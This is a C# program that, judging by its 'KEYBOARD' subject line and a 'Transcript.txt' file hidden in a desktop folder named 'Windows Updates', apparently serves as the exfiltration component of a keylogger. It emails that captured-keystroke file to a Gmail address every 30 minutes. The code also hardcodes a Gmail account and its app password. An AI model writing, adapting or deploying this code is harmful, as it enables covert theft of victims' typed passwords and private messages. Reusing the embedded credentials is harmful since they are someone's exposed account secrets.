using System;
using System.Net;
using System.Net.Mail;
using System.Threading;

namespace EmailSender
{
    class Program
    {
        static void Main(string[] args)
        {
            // Run the code immediately
            SendToEmail("orapajelmar@gmail.com", attachmentPath);

            // Set up a timer to execute the code every 30 minutes
            Timer timer = new Timer(TimerCallback, null, TimeSpan.Zero, TimeSpan.FromMinutes(30));

            // Keep the console application running to allow the timer to keep running
            Console.ReadLine();
        }

        private static void TimerCallback(object state)
        {
            SendToEmail("orapajelmar@gmail.com", attachmentPath);
        }

        static string username = "orapajelmar@gmail.com";
        static string password = "glideqcaaqbxqxru";
        static string attachmentPath = $"{Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}\\Desktop\\Windows Updates\\Transcript.txt";

        static void SendToEmail(string email, string attachmentPath)
        {
            MailMessage message = new MailMessage();
            message.From = new MailAddress(username);
            message.To.Add(email);
            message.Subject = "KEYBOARD";
            message.Body = "Transcript";

            Attachment attachment = new Attachment(attachmentPath);
            message.Attachments.Add(attachment);

            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
            smtp.EnableSsl = true;
            smtp.Credentials = new NetworkCredential(username, password);
            smtp.Send(message);

            Console.WriteLine("Mail Sent");
            attachment.Dispose();
        }
    }
}
